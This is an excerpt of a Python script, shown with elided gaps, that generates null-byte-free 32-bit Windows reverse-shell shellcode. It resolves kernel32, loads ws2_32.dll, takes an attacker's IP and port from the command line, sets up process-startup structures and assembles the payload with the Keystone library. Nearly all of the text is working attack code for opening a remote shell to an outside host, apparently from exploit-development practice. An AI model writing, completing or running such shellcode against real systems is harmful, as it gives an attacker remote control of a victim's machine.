...
class ShellCode:
    ...
    def get_reverse_shell(self, debug=False) -> str:
        ...
        asm = [
            ...
            "   cmp   [edi+12*2], cx                ;",  #   (unicode) modulename[12] == 0x00? (NULL terminator at modulename[12] of kernel32.dll)
            ...
            " load_ws2_32:                           ",  #
            "   xor   eax, eax                      ;",  #   Null EAX
            "   mov   ax, 0x6c6c                    ;",  #   Move the end of the string in AX; ensures that our string will be NULL terminated, while avoiding NULL bytes
            ...
            "   push  esp                           ;",  #   Push ESP to have a pointer to the string; necessary because LoadLibraryA requires a pointer to the string
            "   call  dword ptr [ebp+0x14]          ;",  #   Call LoadLibraryA;
                                                         #   eax = LoadLibrary(TEXT("ws2_32.dll")); 
            ...
            "   push  %s;                            " % self.__sin_addr,
                                                         #   Move the sin_port (example: 443) to AX
            "   mov   ax, %s;                        " % self.__sin_port,
            ...
            "   mov   al, 0x44                      ;",  #   Move 0x44 to AL; ?? sizeof(STARTUPINFOA) = 0x44 bytes; check dt STARTUPINFOA
            "   push  eax                           ;",  #   Push cb
...
def main(argc, argv):
    if argc < 3:
        print("usage: %s <ip> <port> [debug]" % argv[0])
        return

    debug_flag = False    
    debug_flag = argc == 4

    sc = ShellCode(argv[1], argv[2])
    shellcode = sc.get_reverse_shell(debug_flag)

    print(shellcode)
    ks = Ks(KS_ARCH_X86, KS_MODE_32)

    encoding, count = ks.asm(shellcode)
    print("Encoded %s instructions" % count)
